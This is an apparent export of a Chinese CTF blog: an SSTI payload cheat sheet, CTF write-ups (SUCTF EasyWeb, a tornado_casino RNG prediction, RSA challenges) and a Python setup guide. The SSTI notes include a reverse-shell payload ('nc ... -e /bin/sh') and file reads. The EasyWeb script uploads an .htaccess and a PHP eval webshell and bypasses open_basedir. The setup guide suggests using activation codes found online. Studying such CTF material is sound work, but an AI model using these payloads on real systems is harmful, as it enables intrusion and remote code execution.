<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SSTI模版注入</title>
    <url>/2022/07/07/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="ssti">SSTI</h1>
<h2 id="ssti判断">SSTI判断</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>+<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>输入会回显，判断回显值。</p>
<span id="more"></span>
<h2 id="常用的模版引擎">常用的模版引擎</h2>
<h3 id="smarty">smarty</h3>
<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，但是在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
<p>在PHP5即可使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>静态方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
<p>在3.1.30的Smarty版本中官方已经把该静态方法删除。利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<p>if头：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="twig">twig</h3>
<p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。</p>
49
<p>会输出49.</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125; <span class="comment"># 执行任意指令</span></span><br></pre></td></tr></table></figure>
<h3 id="flaskjinja2">flask/jinja2</h3>
49
<p>会输出7777777.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/evil&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from os import system%0aSHELL = system&#x27;</span>) &#125;&#125;</span><br><span class="line">//写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/evil&#x27;</span>) &#125;&#125;</span><br><span class="line">//加载system</span><br><span class="line">&#123;&#123; config[<span class="string">&#x27;SHELL&#x27;</span>](<span class="string">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125;&#125;</span><br><span class="line">//执行命令反弹SHELL</span><br><span class="line">payload:?name=&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="tornado">tornado</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">117.78</span><span class="number">.26</span><span class="number">.79</span>:<span class="number">31093</span>/error?msg=&#123;&#123;handler.settings&#125;&#125; <span class="comment">#获取环境变量，即可获得cookie</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>buu刷题记录：[SUCTF_2019]EasyWeb</title>
    <url>/2022/07/24/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-SUCTF-2019-EasyWeb/</url>
    <content><![CDATA[<p>题目首先给出了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><span id="more"></span></p>
<p>第一步的思路就是绕过waf执行get_the_flag函数，异或绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>
<p>第二步上传文件，base64编码再解码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.abc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://edaa6186-d365-4fdb-bcc8-d15d8c36cb3b.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.abc&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
<p>第三步绕过open_basedir，这个函数规定活动的文件夹范围。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>buu刷题记录：[pasecactf_2019]tornado_casino</title>
    <url>/2022/06/03/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A%5Bpasecactf_2019%5Dtornado_casino/</url>
    <content><![CDATA[<p>首先打开py文件看一眼，输3退出，输2再输b33_1_4m_b3333会让某个自减的东西加一千，输1时会生成一个32位的随机数，并且将输入的随机数与其自己生成的随机数比较，相等则返回flag。</p>
<p>那么题目的思路就很明确了：生成624个随机数并且使用randcrack库计算第625个随机数上传即可。</p>
<span id="more"></span>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29318</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your promocode:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;b33_1_4m_b3333&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">num = []</span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">    data = sh.recvline()</span><br><span class="line">    data = <span class="built_in">str</span>(data)</span><br><span class="line">    data1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        data1 += data[<span class="number">4</span> + <span class="number">2</span> * j]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(data1, <span class="number">16</span>))</span><br><span class="line">aa = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">hex</span>(aa).encode())</span><br><span class="line">sh.recvlines(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>flag:　flag{b346a745-1b98-4908-8e2e-7b25d3d5a46f}</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>mt19937</tag>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title>python环境配置</title>
    <url>/2022/09/27/python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="安装anaconda">1.安装anaconda</h2>
<p>首先去<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">镜像站</a>下载anaconda的镜像</p>
<p><img src="https://s2.loli.net/2022/09/27/47ldkv5GrE2PFDX.png"></p>
<span id="more"></span>
<p>安装anaconda</p>
<p><img src="https://s2.loli.net/2022/09/27/C3b1p9ikwUmAfzY.png"></p>
<p>第一个必选，第二个会在电脑装一个python3.7，如果没有python环境勾选</p>
<h2 id="安装pycharm">2.安装pycharm</h2>
<p>去<a href="https://www.jetbrains.com/zh-cn/pycharm/download/#section=windows">官网</a>下载pycharm专业版，在网上有几率可以找到可用的激活码，或者可以去jetbrain的官网进行<a href="https://www.jetbrains.com/shop/eform/students">学生认证</a>.</p>
<p><img src="https://s2.loli.net/2022/09/27/hquUvejQmnFRENG.png"></p>
<p>1和3都是可选，1是在桌面创建快捷方式，3是在右键菜单创建打开方式</p>
<p>打开后可以在<img src="https://s2.loli.net/2022/09/27/NdHJ89pzf3hTIs4.png"></p>
<p>登录有学生优惠的账号，也可以在<img src="https://s2.loli.net/2022/09/27/QhaFLuIWmsGonkj.png"></p>
<p>输入网上找的可用的激活码。</p>
<p>新建一个项目</p>
<p><img src="https://s2.loli.net/2022/09/27/CBk72cvTs4UGPIj.png"></p>
<p><img src="https://s2.loli.net/2022/09/27/a7OE9GoWF3M41w6.png"></p>
<p><img src="https://s2.loli.net/2022/09/27/7q1YoTiPVEk8p64.png"></p>
<p>选择Anaconda下的python.exe文件</p>
<p>可以运行即可</p>
<p><img src="https://s2.loli.net/2022/09/27/SJuLzUbTZNF3Iaw.png"></p>
<p>然后用pip安装常用包</p>
<p>在cmd中输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>
<p>升级pip版本，然后输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
<p>安装密码需要的Crypto库和pwn需要的pwntools。</p>
]]></content>
  </entry>
  <entry>
    <title>六月作业</title>
    <url>/2022/06/30/%E5%85%AD%E6%9C%88%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<h1 id="六月作业">六月作业</h1>
<h2 id="rsa-file">*RSA File</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub.key&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    text=file.read()</span><br><span class="line">key=RSA.import_key(text)</span><br></pre></td></tr></table></figure>
<p><a href="http://www.hiencode.com/pub_asys.html">在线网站</a></p>
<span id="more"></span>
<h2 id="只有0到4">只有0到4？</h2>
<p>广播攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span></span><br><span class="line">c1 = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span></span><br><span class="line">c2 = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span></span><br><span class="line">c3 = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">int</span>(<span class="built_in">str</span>(n1), <span class="number">5</span>)</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">str</span>(c1), <span class="number">5</span>)</span><br><span class="line">n2 = <span class="built_in">int</span>(<span class="built_in">str</span>(n2), <span class="number">5</span>)</span><br><span class="line">c2 = <span class="built_in">int</span>(<span class="built_in">str</span>(c2), <span class="number">5</span>)</span><br><span class="line">n3 = <span class="built_in">int</span>(<span class="built_in">str</span>(n3), <span class="number">5</span>)</span><br><span class="line">c3 = <span class="built_in">int</span>(<span class="built_in">str</span>(c3), <span class="number">5</span>)</span><br><span class="line">N = [n1, n2, n3]</span><br><span class="line">C = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">resultant, mod = crt(N, C)</span><br><span class="line">value = iroot(resultant, e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(value))</span><br></pre></td></tr></table></figure>
<p>另一种方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(n[i], n[j]) != <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(i, j)  <span class="comment"># 输出对应的n的序号</span></span><br><span class="line">                p = gmpy2.gcd(n[i], n[j])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>, p)</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>, q)</span><br><span class="line">                d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;d = &quot;</span>, d)</span><br><span class="line">                m = <span class="built_in">pow</span>(c[i], d, n[i])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;m = &quot;</span>, m)</span><br></pre></td></tr></table></figure>
<p>两个n有公因子，直接求解</p>
<h2 id="rsa">RSA？</h2>
<p>直接爆破m</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c1= <span class="number">47916081717706538925639104682570684180170502544820197539239827441426724468768104306254078605230687136184497929</span></span><br><span class="line">n1= <span class="number">164133678169710886720989064489094710242148933867688762980230890673424334054283751851389412792855634009922402873730095480540590589967587744481839586009206921690415208556737311431588106941893527836076971942678255228990259381439694065742253470463684082142779114879828632048097049587164541575068678559785497341341</span></span><br><span class="line">c2= <span class="number">63878844405215916614306503133484342687866237414982537489487243642156715327887644418701791728466044672606833177790745723348407141495434918350324367721472060206442057535810542180796122799773614557047720846326110736372382283280049448530028736552356917154044523343646598823659486063811304671208433254991406080968</span></span><br><span class="line">n2= <span class="number">81943314005002234143294576769951701354140501422348161833411886396153974002840590020014331444356263770668675416273077939014396178809052011274358602695903955726427501943378842406211922876951617483948075311923120200295968581991729752554553727773176109055672586268192629406914315361730879469185143748796847985621</span></span><br><span class="line">e2=<span class="number">3</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(gmpy2.iroot(c2+k*n2,e2)[<span class="number">1</span>]==<span class="literal">False</span>):</span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line"><span class="comment">#print(k,c2+k*n2,gmpy2.iroot(c2+k*n2,e2)[0])</span></span><br><span class="line"><span class="comment">#m2=3997474330692954004892367968364354963663898428651951374234371210083046726737590992626245650194376316882</span></span><br><span class="line">e1=<span class="number">2</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(gmpy2.iroot(c1+k*n1,e1)[<span class="number">1</span>]==<span class="literal">False</span>):</span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line"><span class="comment">#print(k,c1+k*n1,gmpy2.iroot(c1+k*n1,e1)[0])</span></span><br><span class="line">m=<span class="number">6922144300555033858896226859793246979270479673047458173</span></span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="break_rsa">Break_RSA</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">25348605574630284342864323710011622959543974652863854537355760576386763162531478272446867731299572532294812374775121121761898206639041068156270466457595336452690367719842145233764550634280981441631262047763246059814963741143303914063537003244814908763379320576260885158458898112416692583017869283284022878603506583499699525249773663841642694427307104140944360804367072787670581252816486834658346431010523135392357008103555699542414687172408709153334263858639251735462278292703380745537045458408951791720967957274781161667526873251066303708008043058246747534357368350540174588670636827470901518225473676343782182718627</span></span><br><span class="line">p4 =<span class="number">0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000</span> </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4096</span>):</span><br><span class="line">    p4=<span class="number">0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000</span></span><br><span class="line">    p4=p4+<span class="built_in">int</span>(<span class="built_in">hex</span>(i),<span class="number">16</span>)</span><br><span class="line">    kbits = pbits - p4.nbits()</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p4</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&quot;n: &quot;</span>, n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>, p)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;q: &quot;</span>, n//p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)   </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
模数为N,N具有一个因子b&gt;=N^β, 0&lt;β&lt;=1.
\]</span></p>
<p>Coppersmith method主要通过LLL方法找到与该多项式具有相同根x0，定义域为整数域的多项式g，即可求解。</p>
<h3 id="lll算法">LLL算法</h3>
<p>LLL算法的目标是找到一个向量空间的近似最短正交基。LLL的约化过程，是先约化前k个基，然后拓展到k+1个基，最终完成全部n个基的约化过程。因为近似最短，所以该算法可求解部分SVP问题，进而求解coppersmith问题。</p>
